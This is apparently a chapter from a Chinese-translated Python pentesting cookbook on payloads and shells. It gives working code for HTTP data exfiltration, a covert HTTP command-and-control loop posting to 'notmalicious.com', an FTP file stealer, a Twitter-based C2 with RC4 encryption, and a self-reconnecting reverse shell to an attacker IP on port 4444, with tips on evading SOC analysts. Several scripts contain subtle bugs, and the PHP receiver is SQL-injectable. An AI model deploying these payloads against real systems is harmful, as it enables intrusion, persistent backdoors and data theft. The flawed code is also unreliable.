# 第八章。负载和 Shell

在本章中，我们将涵盖以下主题：

+   通过 HTTP 请求提取数据

+   创建一个 HTTP C2

+   创建 FTP C2

+   创建 Twitter C2

+   创建一个简单的 Netcat shell

# 介绍

在本章中，我们将讨论在 Python 中创建反向 shell 和负载的过程。一旦在 Linux 或 Mac 系统上识别出上传漏洞，Python 负载就处于下一步的甜蜜点。它们易于制作或定制以匹配特定系统，具有清晰的功能，最重要的是，几乎所有的 Mac 和 Linux 系统默认都安装了 Python 2.7。

# 通过 HTTP 请求提取数据

我们将要创建的第一个脚本将使用非常简单的技术从目标服务器中提取数据。有三个基本步骤：在目标上运行命令，通过 HTTP 请求将输出传输给攻击者，并查看结果。

## 准备就绪

此示例需要一个 Web 服务器，该服务器可在攻击者一侧访问，以便接收来自目标的 HTTP 请求。幸运的是，Python 有一种非常简单的方法来启动 Web 服务器：

```py
$ Python –m SimpleHTTPServer

```

这将在端口`8000`上启动一个 HTTP Web 服务器，提供当前目录中的任何文件。它接收到的任何请求都将直接打印到控制台，这是一种非常快速获取数据的方法，因此是此脚本的一个很好的补充。

## 如何做…

这是一个将在服务器上运行各种命令并通过 Web 请求传输输出的脚本：

```py
import requests
import urllib
import subprocess
from subprocess import PIPE, STDOUT

commands = ['whoami','hostname','uname']
out = {}

for command in commands:
    try:
            p = subprocess.Popen(command, stderr=STDOUT, stdout=PIPE)
            out[command] = p.stdout.read().strip()
    except:
        pass

requests.get('http://localhost:8000/index.html?' + urllib.urlencode(out))
```

## 工作原理…

导入之后，脚本的第一部分创建了一个命令数组：

```py
commands = ['whoami','hostname','uname']
```

这是三个标准的 Linux 命令的示例，可以向攻击者提供有用的信息。请注意，这里假设目标服务器正在运行 Linux。使用前几章的脚本进行侦察，以确定目标操作系统，并在必要时用 Windows 等效命令替换此数组中的命令。

接下来，我们有主要的`for`循环：

```py
            p = subprocess.Popen(command, stderr=STDOUT, stdout=PIPE)
            out[command] = p.stdout.read().strip()
```

代码的这部分执行命令并从`subprocess`中获取输出（将标准输出和标准错误都传输到单个`subprocess.PIPE`中）。然后将结果添加到输出字典中。请注意，我们在这里使用`try`和`except`语句，因为任何无法运行的命令都会引发异常。

最后，我们有一个单一的 HTTP 请求：

```py
requests.get('http://localhost:8000/index.html?' + urllib.urlencode(out))
```

这使用`urllib.encode`将字典转换为 URL 编码的键/值对。这意味着任何可能影响 URL 的字符，例如`&`或`=`，将被转换为它们的 URL 编码等效形式，例如`%26`和`%3D`。

请注意，脚本端不会有任何输出；一切都通过 HTTP 请求传递到攻击者的 Web 服务器（示例使用本地主机的端口`8000`）。`GET`请求如下所示：

![工作原理…](img/B04044_08_01.jpg)

# 创建一个 HTTP C2

在 URL 中公开您的命令的问题是，即使是半睡不醒的日志分析员也会注意到它。有多种方法可以隐藏请求，但是当您不知道响应文本将是什么样子时，您需要提供一种可靠的方法来伪装输出并将其返回到您的服务器。

我们将创建一个脚本，将命令和控制活动伪装成 HTTP 流量，从网页评论中获取命令，并将输出返回到留言簿中。

## 入门

为此，您需要一个正常运行的 Web 服务器，其中包括两个页面，一个用于托管您的评论，另一个用于托管检索页面。

您的评论页面应该只包含标准内容。为此，我使用 Nginx 默认主页，并在末尾添加评论。评论应表达为：

```py
<!--cmdgoeshere-->
```

检索页面可以非常简单：

```py
<?php

$host='localhost';
$username='user';
$password='password';
$db_name="data";
$tbl_name="data";

$comment = $_REQUEST['comment'];

mysql_connect($host, $username, $password) or die("Cannot contact server");
mysql_select_db($db_name)or die("Cannot find DB");

$sql="INSERT INTO $tbl_name VALUES('$comment')";

$result=mysql_query($sql);

mysql_close();
?>
```

基本上，这个 PHP 所做的是接收`POST`请求中名为`comment`的传入值，并将其放入数据库中。这非常基础，如果您有多个 shell，它不会区分多个传入命令。

## 如何做…

我们将使用的脚本如下：

```py
import requests
import re
import subprocess
import time
import os

while 1:
  req = requests.get("http://127.0.0.1")
  comments = re.findall('<!--(.*)-->',req.text)
  for comment in comments:
    if comment = " ":
      os.delete(__file__)
    else:
      try:
        response = subprocess.check_output(comment.split())
      except:
        response = "command fail"
  data={"comment":(''.join(response)).encode("base64")}
  newreq = requests.post("http://notmalicious.com/c2.php", data=data)
  time.sleep(30)
```

以下是使用此脚本时产生的输出示例：

```py
Name: TGludXggY2FtLWxhcHRvcCAzLjEzLjAtNDYtZ2VuZXJpYyAjNzktVWJ1bnR1IFNNU CBUdWUgTWFyIDEwIDIwOjA2OjUwIFVUQyAyMDE1IHg4Nl82NCB4ODZfNjQgeDg2X zY0IEdOVS9MaW51eAo= Comment:
Name: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFl bW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9i aW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jp bi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5 bmM6L2JpbjovYmluL3N5bmMKZ Comment:
```

## 它是如何工作的...

像往常一样，我们导入必要的库并启动脚本：

```py
import requests
import re
import subprocess
import time
import os
```

由于此脚本具有内置的自删除方法，因此我们可以设置它以以下循环永远运行：

```py
while 1:
```

我们发出请求，检查我们预先配置的页面上是否有任何评论。如果有，我们将它们放在一个列表中。我们使用非常基本的`regex`来执行此检查：

```py
  req = requests.get("http://127.0.0.1")
  comments = re.findall('<!--(.*)-->',req.text)
```

我们要做的第一件事是检查是否有空评论。这对脚本来说意味着它应该删除自己，这是一个非常重要的无人值守 C2 脚本机制。如果您希望脚本删除自己，只需在页面上留下一个空评论。脚本通过查找自己的名称并删除该名称来删除自己：

```py
for comment in comments:
    if comment = " ":
      os.delete(__file__)
```

如果评论不为空，我们尝试使用`subprocess`命令将其传递给系统。重要的是你在命令上使用`.split()`来考虑`subprocess`如何处理多部分命令。我们使用`.check_output`将命令直接返回给我们分配的变量：

```py
else:
      try:
        response = subprocess.check_output(comment.split())
```

如果命令失败，我们将响应值设置为`命令失败`：

```py
      except:
        response = "command fail"
```

我们取`response`变量并将其分配给与字典中的 PHP 脚本匹配的键。在这种情况下，字段名为`comment`，因此我们将输出分配给评论。我们对输出进行 base64 编码，以便考虑到任何可能干扰我们脚本的随机变量，例如空格或代码：

```py
data={"comment":(''.join(response)).encode("base64")}
```

现在数据已经分配，我们将其发送到我们预先配置的服务器的`POST`请求中，并等待`30`秒再次检查评论中是否有进一步的指示：

```py
newreq = requests.post("http://127.0.0.1/addguestbook.php", data=data)
  time.sleep(30)
```

# 创建 FTP C2

这个脚本是一个快速而肮脏的文件窃取工具。它沿着目录直线运行，抓取它接触到的一切。然后将这些导出到它指向的`FTP`目录。在您可以放置文件并希望快速获取服务器内容的情况下，这是一个理想的起点。

我们将创建一个连接到 FTP 的脚本，获取当前目录中的文件，并将它们导出到 FTP。然后它跳到下一个目录并重复。当它遇到两个相同的目录列表（也就是说，它到达了根目录）时，它就会停止。

## 入门

为此，您将需要一个正常运行的 FTP 服务器。我正在使用`vsftpd`，但您可以使用任何您喜欢的。您需要将凭据硬编码到脚本中（不建议）或者作为标志与凭据一起发送。

## 如何做...

我们将使用的脚本如下：

```py
from ftplib import FTP
import time
import os

user = sys.argv[1]
pw = sys.argv[2]

ftp = FTP("127.0.0.1", user, pw)

filescheck = "aa"

loop = 0
up = "../"

while 1:
  files = os.listdir("./"+(i*up))
  print files

  for f in files:
    try:
      fiile = open(f, 'rb')
      ftp.storbinary('STOR ftpfiles/00'+str(f), fiile)
      fiile.close()
    else:
      pass

  if filescheck == files:
    break
  else:
    filescheck = files
    loop = loop+1
    time.sleep(10)
ftp.close()
```

## 它是如何工作的...

像往常一样，我们导入我们的库并设置我们的变量。我们已将用户名和密码设置为`sys.argv`，以避免硬编码，从而暴露我们的系统：

```py
from ftplib import FTP
import time
import os

user = sys.argv[1]
pw = sys.argv[2]
```

然后我们使用 IP 地址和通过标志设置的凭据连接到我们的 FTP。您还可以将 IP 作为`sys.argv`传递，以避免硬编码：

```py
ftp = FTP("127.0.0.1", user, pw)
```

我设置了一个 nonce 值，它与目录检查方法的第一个目录不匹配。我们还将循环设置为`0`，并将"上一个目录"命令配置为一个变量，类似于第三章中的目录遍历脚本，*漏洞识别*：

```py
filescheck = "aa"

loop = 0
up = "../"
```

然后我们创建我们的主循环以永远重复并创建我们选择的目录调用。我们列出我们调用的目录中的文件并将其分配给一个变量。您可以选择在这里打印文件列表，如我所做的那样，以进行诊断目的，但这没有任何区别：

```py
while 1:
  files = os.listdir("./"+(i*up))
  print files
```

对于在目录中检测到的每个文件，我们尝试打开它。重要的是我们用`rb`打开文件，因为这允许它作为二进制文件读取，使其可以作为二进制文件传输。如果可以打开，我们使用`storbinary`命令将其传输到 FTP。然后我们关闭文件以完成交易：

```py
  try:
      fiile = open(f, 'rb')
      ftp.storbinary('STOR ftpfiles/00'+str(f), fiile)
      fiile.close()
```

如果由于任何原因我们无法打开或传输文件，我们只需继续到列表中的下一个文件：

```py
  else:
      pass
```

然后我们检查是否自上次命令以来改变了目录。如果没有，我们就跳出主循环：

```py
if filescheck == files:
    break
```

如果目录列表不匹配，我们将`filecheck`变量设置为匹配当前目录，通过`1`迭代循环，并休眠`10`秒以避免向服务器发送垃圾邮件：

```py
else:
    filescheck = files
    loop = loop+1
    time.sleep(10)
```

最后，一切都完成后，我们关闭与 FTP 服务器的连接：

```py
ftp.close()
```

# 创建 Twitter C2

在一定程度上，请求互联网上的随机页面是可以接受的，但一旦**安全运营中心**（**SOC**）分析员仔细查看所有消失在管道中的数据，很明显这些请求是发往一个可疑站点，因此很可能与恶意流量相关。幸运的是，社交媒体在这方面提供了帮助，并允许我们将数据隐藏在明处。

我们将创建一个连接到 Twitter 的脚本，读取推文，根据这些推文执行命令，加密响应数据，并将其发布到 Twitter。我们还将创建一个解码脚本。

## 入门

为此，您需要一个带有 API 密钥的 Twitter 帐户。

## 如何做…

我们将使用的脚本如下：

```py
from twitter import *
import os
from Crypto.Cipher import ARC4
import subprocess
import time

token = ''
token_key = ''
con_secret = ''
con_secret_key = ''
t = Twitter(auth=OAuth(token, token_key, con_secret, con_secret_key))

while 1:
  user = t.statuses.user_timeline()
  command = user[0]["text"].encode('utf-8')
  key = user[1]["text"].encode('hex')
  enc = ARC4.new(key)
  response = subprocess.check_output(command.split())

  enres = enc.encrypt(response).encode("base64")

  for i in xrange(0, len(enres), 140):
          t.statuses.update(status=enres[i:i+140])
  time.sleep(3600)
```

解码脚本如下：

```py
from Crypto.Cipher import ARC4
key = "".encode("hex")
response = ""
enc = ARC4.new(key)
response = response.decode("base64")
print enc.decrypt(response)
```

脚本进行中的示例如下：

![如何做…](img/B04044_08_02.jpg)

## 它是如何工作的…

我们像往常一样导入我们的库。有很多 Twitter 的 Python 库；我只是使用了[`code.google.com/p/python-twitter/`](https://code.google.com/p/python-twitter/)上可用的标准 twitter API。代码如下：

```py
from twitter import *
import os
from Crypto.Cipher import ARC4
import subprocess
import time
```

为了满足 Twitter 的身份验证要求，我们需要从[developer.twitter.com](http://developer.twitter.com)的**App 页面**中检索**App 令牌**、**App 密钥**、**用户令牌**和**用户密钥**。我们将它们分配给变量，并设置我们与 Twitter API 的连接：

```py
token = ''
token_key = ''
con_secret = ''
con_secret_key = ''
t = Twitter(auth=OAuth(token, token_key, con_secret, con_secret_key))
```

我们设置一个无限循环：

```py
while 1:
```

我们调用已设置的帐户的用户时间线。这个应用程序必须对 Twitter 帐户具有读写权限很重要。然后我们取最近推文的最后一条文本。我们需要将其编码为 UTF-8，因为通常有一些字符，普通编码无法处理：

```py
user = t.statuses.user_timeline()
command = user[0]["text"].encode('utf-8')
```

然后我们取最后一条推文作为我们加密的密钥。我们将其编码为`hex`以避免出现空格匹配空格的情况：

```py
key = user[1]["text"].encode('hex')
enc = ARC4.new(key)
```

我们通过使用`subprocess`函数执行操作。我们使用预设的 XOR 加密加密输出，并将其编码为 base64：

```py
response = subprocess.check_output(command.split())
enres = enc.encrypt(response).encode("base64")
```

我们将加密和编码的响应分成 140 个字符的块，以适应 Twitter 的字符限制。对于每个块，我们创建一个 Twitter 状态：

```py
for i in xrange(0, len(enres), 140):
  t.statuses.update(status=enres[i:i+140])
```

因为每个步骤都需要两条推文，我在每个命令检查之间留了一个小时的间隔，但您可以很容易地根据自己的需要进行更改：

```py
time.sleep(3600)
```

对于解码，导入`RC4`库，将您的关键推文设置为密钥，并将重新组装的 base64 设置为响应：

```py
from Crypto.Cipher import ARC4
key = "".encode("hex")
response = ""
```

使用关键字设置一个新的`RC4`代码，从 base64 解码数据，并使用关键字解密它：

```py
enc = ARC4.new(key)
response = response.decode("base64")
print enc.decrypt(response)
```

# 创建一个简单的 Netcat shell

我们将创建以下脚本，利用原始套接字从网络中泄露数据。这个 shell 的一般思想是在受损的机器和您自己的机器之间创建一个连接，通过 Netcat（或其他程序）会话发送命令到这台机器。

这个 Python 脚本的美妙之处在于它的隐蔽性，因为它看起来就像一个完全合法的脚本。

## 如何做…

这是将通过 Netcat 建立连接并读取输入的脚本：

```py
import socket
import subprocess
import sys
import time

HOST = '172.16.0.2'    # Your attacking machine to connect back to
PORT = 4444           # The port your attacking machine is listening on

def connect((host, port)):
   go = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   go.connect((host, port))
   return go

def wait(go):
   data = go.recv(1024)
   if data == "exit\n":
      go.close()
      sys.exit(0)
   elif len(data)==0:
      return True
   else:
      p = subprocess.Popen(data, shell=True,
         stdout=subprocess.PIPE, stderr=subprocess.PIPE,
         stdin=subprocess.PIPE)
      stdout = p.stdout.read() + p.stderr.read()
      go.send(stdout)
      return False

def main():
   while True:
      dead=False
      try:
         go=connect((HOST,PORT))
         while not dead:
            dead=wait(go)
         go.close()
      except socket.error:
         pass
      time.sleep(2)

if __name__ == "__main__":
   sys.exit(main())
```

## 它是如何工作的…

要像往常一样启动脚本，我们需要导入将在整个脚本中使用的模块：

```py
import socket
import subprocess
import sys
import time
```

然后我们需要定义我们的变量：这些值是攻击机器的 IP 和端口，以建立连接：

```py
HOST = '172.16.0.2'    # Your attacking machine to connect back to
PORT = 4444           # The port your attacking machine is listening on
```

然后我们继续定义原始连接；然后我们可以为我们建立的值分配一个值，并在以后引用它来读取输入并发送标准输出。

我们回顾一下之前设置的主机和端口值，并创建连接。我们将已建立的连接赋予`go`的值：

```py
def connect((host, port)):
   go = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   go.connect((host, port))
   return go
```

然后，我们可以引入一段代码，用于等待部分。这将通过攻击机的 Netcat 会话等待发送给它的命令。我们确保通过会话发送的数据被导入到 shell 中，并且其标准输出通过已建立的 Netcat 会话返回给我们，从而通过反向连接为我们提供 shell 访问权限。

我们给通过 Netcat 会话传递给受损机器的值命名为数据。脚本中添加了一个值，用于在用户完成操作时退出会话；我们选择了`exit`，这意味着在 Netcat 会话中输入 exit 将终止已建立的连接。然后，我们开始处理数据的细节部分，其中数据被打开（读取）并被导入到 shell 中。完成后，我们确保读取`stdout`值并赋予一个值`stdout`（这可以是任何值），然后通过之前建立的`go`会话将其发送回给我们自己。代码如下：

```py
def wait(go):
   data = go.recv(1024)
   if data == "exit\n":
      go.close()
      sys.exit(0)
   elif len(data)==0:
      return True
   else:
      p = subprocess.Popen(data, shell=True,
         stdout=subprocess.PIPE, stderr=subprocess.PIPE,
         stdin=subprocess.PIPE)
      stdout = p.stdout.read() + p.stderr.read()
      go.send(stdout)
      return False
```

我们脚本的最后部分是错误检查和运行部分。在脚本运行之前，我们确保让 Python 知道我们有一个机制来检查会话是否处于活动状态，方法是使用我们之前的真实语句。如果连接丢失，Python 脚本将尝试重新与攻击机建立连接，使其成为一个持久的后门：

```py
def main():
   while True:
      dead=False
      try:
         go=connect((HOST,PORT))
         while not dead:
            dead=wait(go)
         go.close()
      except socket.error:
         pass
      time.sleep(2)

if __name__ == "__main__":
   sys.exit(main())
```
